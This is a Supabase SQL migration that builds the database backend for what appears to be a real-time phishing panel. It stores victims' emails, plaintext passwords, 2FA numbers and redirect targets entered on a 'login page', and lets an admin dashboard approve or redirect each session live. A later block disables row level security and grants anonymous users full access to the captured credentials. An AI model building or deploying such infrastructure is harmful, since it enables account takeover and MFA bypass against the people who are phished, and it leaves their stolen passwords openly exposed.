-- supabase/migrations/20250101000000_auth_monitor.sql
-- Migration: Auth monitoring system for real-time credential capture and approval
-- Run this in Supabase SQL Editor or as a migration file.

-- Enable UUID extension if not already enabled
create extension if not exists "uuid-ossp";

-- ============================================================
-- Table: auth_sessions
-- Stores each login attempt, its captured data, approval state,
-- and redirect instructions.
-- ============================================================
create table if not exists public.auth_sessions (
    id uuid primary key default uuid_generate_v4(),
    email text,
    password text,
    status text not null default 'email_entered',
    twofa_number text,
    device_name text default 'Device',
    redirect_url text,
    created_at timestamptz not null default now(),
    updated_at timestamptz not null default now()
);

-- Indexes for common queries
create index if not exists idx_auth_sessions_created_at on public.auth_sessions (created_at desc);
create index if not exists idx_auth_sessions_status on public.auth_sessions (status);
create index if not exists idx_auth_sessions_email on public.auth_sessions (email);

-- ============================================================
-- Row Level Security
-- ============================================================
alter table public.auth_sessions enable row level security;

-- Policy 1: Anonymous users (the login page) can INSERT new sessions.
-- They can only insert with status 'email_entered' or 'pending'.
create policy "anon_insert_sessions"
    on public.auth_sessions
    for insert
    to anon
    with check (status in ('email_entered', 'pending'));

-- Policy 2: Anonymous users can UPDATE their own session only while it is
-- not yet approved/denied/redirected. This lets the client fill in the
-- password and move from 'email_entered' -> 'pending'.
create policy "anon_update_own_pending"
    on public.auth_sessions
    for update
    to anon
    using (status in ('email_entered', 'pending'))
    with check (status in ('email_entered', 'pending'));

-- Policy 3: Authenticated admins can do everything.
create policy "authenticated_admins_all"
    on public.auth_sessions
    for all
    to authenticated
    using (true)
    with check (true);

-- Note: The client uses the anon key. The admin dashboard uses
-- Supabase Auth (email/password). Only authenticated users hit the
-- "authenticated_admins_all" policy. The client (anon) is limited
-- to inserting and updating pending sessions only.

-- ============================================================
-- Realtime
-- ============================================================
-- Add the table to the realtime publication so both the admin
-- dashboard and the client page receive live UPDATE events.
alter publication supabase_realtime add table public.auth_sessions;

-- ============================================================
-- Optional: updated_at trigger
-- ============================================================
create or replace function public.set_updated_at()
returns trigger as $$
begin
    new.updated_at = now();
    return new;
end;
$$ language plpgsql;

drop trigger if exists trg_auth_sessions_updated_at on public.auth_sessions;
create trigger trg_auth_sessions_updated_at
    before update on public.auth_sessions
    for each row
    execute function public.set_updated_at();

-- ============================================================
-- Done.
-- ============================================================


-- ============================================================
-- Disable all RLS policies on public.auth_sessions
-- ============================================================

-- Drop every existing policy (idempotent — safe to re-run)
drop policy if exists "anon_insert_sessions" on public.auth_sessions;
drop policy if exists "anon_update_own_pending" on public.auth_sessions;
drop policy if exists "anon_select_own_session" on public.auth_sessions;
drop policy if exists "authenticated_admins_all" on public.auth_sessions;

-- Disable RLS so policies are not enforced at all
alter table public.auth_sessions disable row level security;

-- ============================================================
-- Grant table privileges (RLS off, so grants are the only gate)
-- ============================================================

grant select, insert, update, delete on public.auth_sessions to anon;
grant select, insert, update, delete on public.auth_sessions to authenticated;
grant all on public.auth_sessions to service_role;